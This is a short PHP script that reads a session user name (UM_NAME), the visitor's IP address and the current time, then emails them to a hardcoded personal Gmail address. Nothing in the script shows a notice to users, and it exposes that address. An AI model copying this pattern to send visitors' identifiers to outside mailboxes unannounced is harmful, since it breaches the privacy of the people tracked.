<?php

include('ip.php');
include('time.php');



session_start();

$msg = "UM_NAME = ".$_SESSION['UM_NAME'];
$msg = $msg."\nIP = ".getRealIpAddr();
$msg .= "\nTime = ".FormatTime(time());

mail("jeffsallans@gmail.com", "info", $msg);

?>
